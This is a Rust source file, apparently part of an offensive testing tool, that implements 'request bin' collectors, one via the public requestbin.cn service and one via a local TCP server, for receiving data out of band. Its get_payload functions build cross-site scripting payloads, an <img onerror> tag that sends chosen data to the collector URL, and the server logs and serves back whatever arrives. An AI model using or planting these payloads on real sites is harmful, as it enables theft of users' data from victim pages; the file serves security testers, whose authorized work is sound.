use reqwest::{Client, Error};
use serde_json::{value, Value};
use scraper::{Html, Selector};
use std::thread;
use scraper::error::SelectorErrorKind;

#[derive(Debug)]
pub enum RequestBin {
    Public(PublicRequestBin),
    Private(PrivateRequestBin)
}

impl RBin for RequestBin {
    async fn read(&self) -> Result<Vec<String>, RequestBinError> {
        match self {
            RequestBin::Private(private) => { private.read().await },
            RequestBin::Public(public) => { public.read().await }
        }
    }
    async fn write(&self, data: String) -> Result<(), RequestBinError> {
        match self {
            RequestBin::Private(private) => { private.write(data).await },
            RequestBin::Public(public) => { public.write(data).await }
        }
    }
    fn get_payload(&self, withdata: String) -> String {
        match self {
            RequestBin::Private(private) => { private.get_payload(withdata) },
            RequestBin::Public(public) => { public.get_payload(withdata) }
        }
    }
}


#[derive(Debug)]
pub struct RequestBinError {
    pub value: String
}
impl From<Error> for RequestBinError {
    fn from(item: Error) -> Self {
        Self { value: item.to_string() }
    }
}
impl From<std::string::String> for RequestBinError {
    fn from(item: String) -> Self {
        Self { value: item }
    }
}
impl From<SelectorErrorKind<'_>> for RequestBinError {
    fn from(item: SelectorErrorKind<'_>) -> Self {
        Self { value: item.to_string() }
    }
}
impl From<std::io::Error> for RequestBinError {
    fn from(item: std::io::Error) -> Self {
        Self { value: item.to_string() }
    }
}
pub trait RBin {
    fn write(&self, data: String) -> impl Future<Output = Result<(), RequestBinError>>;
    fn read(&self) -> impl Future<Output = Result<Vec<String>, RequestBinError>>;
    fn get_payload(&self, withdata: String) -> String;
}



#[derive(Debug)]
pub struct PublicRequestBin {
    webclient: Client,
    name: String
}

impl PublicRequestBin {
    pub async fn new() -> Result<Self, RequestBinError> {
        let builder = Client::builder();
        let client = builder.build()?;
        let name = client.post("http://requestbin.cn/api/v1/bins").send().await?
            .json::<Value>().await?.get("name").ok_or(RequestBinError {
                    value: String::from("Could not find request bin name in response.")})?.as_str().ok_or(
            RequestBinError{ value: String::from("Could not convert bin name to str.") })?.to_string();
        Ok(Self {
            webclient: client,
            name: name
        })
    }
}    
impl RBin for PublicRequestBin {
    async fn write(&self, data: String) -> Result<(), RequestBinError> {
        let _ = self.webclient.get(format!("http://requestbin.cn/{}?data={}", self.name, data).as_str()).send().await?;
        Ok(())
    }

    async fn read(&self) -> Result<Vec<String>, RequestBinError> {
        let response_text = self.webclient.get(format!("http://requestbin.cn/{}?inspect", self.name)
            .as_str()).send().await?.text().await?;
        let mut stringlist = Vec::<String>::new();

        let fragment = Html::parse_fragment(response_text.as_str());
        let selector = Selector::parse("span.querystring")?;
    
        for elem in fragment.select(&selector) {
            stringlist.push(elem.inner_html().rsplit("data=").next().ok_or(RequestBinError{
            value: String::from("Could not find data in request bin.")})?.to_string());
        }
        Ok(stringlist)
    }
    fn get_payload(&self, withdata: String) -> String {
        format!("<img src=\"\" onerror=\"new Image().src='http://requestbin.cn/{}?data={}'\"/>", self.name, withdata)
    }
}


#[derive(Debug)]
pub struct PrivateRequestBin {
    webclient: Client,
    baseurl: String,
    server: thread::JoinHandle<()>
}

impl PrivateRequestBin {
    pub fn new(ip: impl AsRef<str>, port: u16) -> Result<Self, RequestBinError> {
        let bindaddr = format!("{}:{}", ip.as_ref(), port);
        let baseurl = format!("http://{}/", bindaddr);
        let mut server = PrivateServer::new(bindaddr)?;
        let builder = Client::builder();
        let client = builder.build()?;
        let srv_thread = thread::spawn(move || {
            server.start();
        });
        Ok(Self {
            webclient: client,
            baseurl: baseurl,
            server: srv_thread
        })
    }
}

impl RBin for PrivateRequestBin {
    async fn write(&self, data: String) -> Result<(), RequestBinError> {
        let _ = self.webclient.get(format!("{}?data={}", self.baseurl, data).as_str()).send().await?;
        Ok(())
    }

    async fn read(&self) -> Result<Vec<String>, RequestBinError> {
        let response_text = self.webclient.get(format!("{}?inspect", self.baseurl)
            .as_str()).send().await?.text().await?;
        let mut stringlist = Vec::<String>::new();

        let fragment = Html::parse_fragment(response_text.as_str());
        let selector = Selector::parse("p")?;
    
        for elem in fragment.select(&selector) {
            stringlist.push(elem.inner_html());
        }
        Ok(stringlist)
    }
    fn get_payload(&self, withdata: String) -> String {
        format!("<img src=\"\" onerror=\"new Image().src='{}?data={}'\"/>", self.baseurl, withdata)
    }
}


use std::{
    io::{BufReader, prelude::*},
    net::{TcpListener, TcpStream},
};

pub struct PrivateServer {
    listener: TcpListener,
    known_data: Vec<String>
}

impl PrivateServer {
    pub fn new(bind_addr: impl AsRef<str>) -> Result<Self, String> {
        let listener = match TcpListener::bind(bind_addr.as_ref()) {
            Ok(v) => {v},
            Err(e)=> {return Err(format!("Could not bind address {}: {}", bind_addr.as_ref(), e));}
        };
        Ok(Self {
            listener: listener,
            known_data: Vec::new()
        })
    }
    pub fn start(&mut self) {
        for stream in self.listener.incoming() {
            match stream {
                Ok(stream) => {
                    match PrivateServer::handle_connection(&mut self.known_data.clone(), stream){
                        Ok(data) => {self.known_data=data;},
                        Err(_)=>{}
                    };
                },
                Err(_) => {}
            };
        }
    }
    fn handle_connection(known_data: &mut Vec<String>, mut stream: TcpStream) -> Result<Vec<String>, RequestBinError> {
        let buf_reader = BufReader::new(&stream);
        let request_line = buf_reader.lines().next()
            .ok_or(RequestBinError{value: "Empty buffer in request".to_string()})??;

        let mut resp_data = String::from("");
        if request_line.contains("data=") {
            known_data.push(request_line.rsplit("data=").next()
                .ok_or(RequestBinError{value: "No data in request".to_string()})?
                .to_string().rsplit(" ").last()
                .ok_or("Error while getting data from request".to_string())?.to_string());
        } else {
                for d in known_data.iter() {
                    resp_data.push_str(format!("<p>{}</p>", d).as_str());
                }
        }
        let length = resp_data.len();
        let status_line = String::from("HTTP/1.1 200 OK");
        let response =
            format!("{status_line}\r\nContent-Length: {length}\r\n\r\n{resp_data}");
        stream.write_all(response.as_bytes())?;
        Ok(known_data.to_vec())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_private_server() {
        assert!(PrivateServer::new("127.0.0.1:8082").is_ok());
        assert!(PrivateServer::new("badbind").is_err());
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 1)]
    async fn test_public_bin() -> Result<(), String> {
        let bin = match PublicRequestBin::new().await {
            Ok(v) => {v},
            Err(e) => {
              return Err(format!("Could not create client: {}", e.value));
            }
        };
        let _ = match bin.write("0xdeadbeef".to_string()).await {
            Ok(v) => {v},
            Err(e) => {
                return Err(format!("Could not write string: {}", e.value));
            }
        };
        let response = match bin.read().await {
            Ok(v) => {v},
            Err(e) => {
                return Err(format!("Could not read strings: {}", e.value));
            }
        };
        assert_eq!(response, vec!["0xdeadbeef"]);
        Ok(())
    }

    #[tokio::test]
    async fn test_private_bin() -> Result<(), String> {
        let bin = match PrivateRequestBin::new("127.0.0.1", 8081) {
            Ok(v) => {v},
            Err(e) => {
              return Err(format!("Could not create client: {}", e.value));
            }
        };
        let _ = match bin.write("0xdeadbeef".to_string()).await {
            Ok(v) => {v},
            Err(e) => {
                return Err(format!("Could not write string: {}", e.value));
            }
        };
        let response = match bin.read().await {
            Ok(v) => {v},
            Err(e) => {
                return Err(format!("Could not read strings: {}", e.value));
            }
        };
        assert_eq!(response, vec!["0xdeadbeef"]);
        Ok(())
    }
}

